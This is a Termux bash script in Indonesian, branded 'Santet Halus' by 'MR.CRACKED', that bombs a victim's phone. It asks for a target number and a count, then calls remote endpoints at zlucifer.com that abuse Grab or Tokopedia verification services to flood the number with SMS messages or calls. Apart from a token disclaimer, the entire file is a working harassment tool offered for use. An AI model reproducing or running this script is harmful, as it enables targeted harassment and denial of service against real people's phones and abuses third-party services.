#!/data/data/com.termux/files/usr/bin/bash
#PERINGATAN : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI
#GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :v
clear
sleep 1
sh …….sh
clear
troll(){
    clear
toilet -f mono12 -F metal "Santet"
toilet -f mono12 -F metal "Halus"
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/sms.php)
get_call=$(curl -s http://zlucifer.com/api/call.php)
mulai (){
    echo "Masih Pengen Nyantet Lagi?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Terimakasih Tamu MR.CRACKED"
    fi
}
#spam
spam(){
    clear
    troll
    echo
    echo "[1] Santet media  SMS"
    echo "[2] Santet media Telp"
    echo "[3] Keluar!Takut dosa"
    echo
    echo "1/2/3?"
    read pilih
    if [ $pilih = "1" ]; then
            echo "Santet via SMS"
            #function spam
            echo
            echo "Masukan nomor target"
            echo contoh 08591757225
            read target # masukin no telp
            echo
            echo "Mau kirim setan berapa"
            read paket
            echo
            echo Yakin nggak takut dosa $target "sebentar lagi SMS akan kirim "$paket" ?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan spam SMS ke nomor $target
                    echo
                    echo "Tunggu 15 detik dan korban akan terusik"
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Gunakan tools dengan bijak"
                    echo
                    echo " Don't forget my name "
                    echo " CRACKED"
                    echo "======================================="
            else
                    echo "Kesalahan"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Santet via Telp"
            #function spam
            echo
            echo "Masukan nomor telp. korban"
            echo contoh 08517272818
            read target # masukin no telp
            echo
            echo "Gunakan API Grab/Toped?"
            echo "[1] GRAB"
            echo "[2] TOPED"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan spam call ke nomor $target
                  echo
                  echo "Tunggu 15 detik dan korban akan terusik"
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " Gunakan tools dengan bijak"
                  echo
                  echo " Don't forget my name "
                  echo " CRACKED"
                  echo "========================================"
            else
                  echo Kesalahan, silahkan coba lagi
            fi
        mulai
    elif [ $pilih = "3" ]; then
        toilet -f mono12 -F metal "Thanks"
        close
    else
        clear
        echo "Kesalahan"
        mulai
    fi
}
close(){
    exit
}
clear
echo "Loading.."
load
clear
troll
echo Selamat datang tamu MR.CRACKED, Siapa nama kamu? #tulisan keluar
read nick #membaca yang ditulis
clear
echo "Loading.."
load
clear
troll
echo Yakin nggak takut dosa?  $nick ":)"
echo
echo "Mulai Hacking?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi
